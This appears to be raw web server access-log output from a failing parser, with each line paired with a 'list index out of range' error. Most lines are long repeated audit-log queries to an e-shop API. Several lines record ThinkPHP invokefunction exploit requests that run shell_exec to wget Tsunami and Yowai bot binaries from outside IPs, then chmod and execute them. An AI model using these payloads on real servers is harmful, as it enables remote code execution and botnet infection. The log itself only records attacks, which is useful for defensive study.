201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('91.99.30.32 - - [23/Jan/2019:11:21:57 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('91.99.30.32 - - [23/Jan/2019:11:22:38 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('112.28.77.213 - - [23/Jan/2019:11:24:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('122.196.231.141 - - [23/Jan/2019:11:39:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.99.30.32 - - [23/Jan/2019:11:43:33 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('74.82.17.87 - - [23/Jan/2019:11:53:42 +0330] "&\\xBEi\\x86p\\xBAOt}U\\x95\\xB3\\x5C\\x1F\\x02\\x1D\\x84\\xD7\\xAA{3]\\x1B\\x9BK\\xE2\\xEF\\xF79\\xBB\\xFD\\x05g\\xFB\\x1B\\xE5\\xFD1\\xCEJ\\xFB\\xD0\\xBE\\xF8/\\xBD_y\\xE0WX\\xF7,]\\xDC\\xBD\\xFE\\xE5\\xD5\\x7Fr\\xA5\\x9B\\xFB\\x97H[v\\x7F\\xF3\\xE2\\xEELa\\xCA:\\x10\\xEE\\xC5^K\\xE0\\xBF\\x09\\xE0Uy\\x1F\\x81[\\x5C\\x8C\\xF8\\xA3<\\x90\\xF8\\xAB\\x1F\\xD8\\xDF$\\xE0p\\x96\\xFF\\x00\\xDC\\x11\\xE4v3\\xD2\\x98\\xA8" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.17.87 - - [23/Jan/2019:11:55:26 +0330] "E\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x039\\xDCt\\xBD\\xC3\\x84\\x0B\\xE6\\x12\\xF4\\xE2\\xE3\\x8DU\\x1D[\\xE0\\xCCT\\xAF\\xFF\\xE5\\xE1\\xF6\\x9C\\xD4\\x87\\xD3\\x9E\\xFA\\xAA\\x16 \\xEC\\x9E\\x15\\xAB~_j\\xA6\\x96:\\xED9\\xA59\\xE9[t\\xCF\\x86\\xAA\\x93\\x88K\\x85\\xD4FhU=b\\x88]\\x00\\x1E\\xC0+\\xC0/\\xCC\\xA9\\xCC\\xA8\\xC0,\\xC00\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('58.186.25.218 - - [23/Jan/2019:11:56:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.66 - - [23/Jan/2019:12:07:16 +0330] "\\x00\\x84\\x00\\x01\\x01\\x01\\x01\\x01\\x04\\xD2\\x00\\xA7\\x12\\xC2\\x10\\xC8D*\\xA3\\x17\\xE2\\xD9" 400 166 "-" "-" "-"\n', 'list index out of range')
('213.41.230.66 - - [23/Jan/2019:12:37:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('74.82.60.85 - - [23/Jan/2019:12:43:24 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\x8E\\x18\\xAD\\xC2\\xA6\\xAA" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.60.85 - - [23/Jan/2019:12:43:27 +0330] "\\x00\\x00\\x00\\x03\\x16edge-stun.facebook.com" 400 166 "-" "-" "-"\n', 'list index out of range')
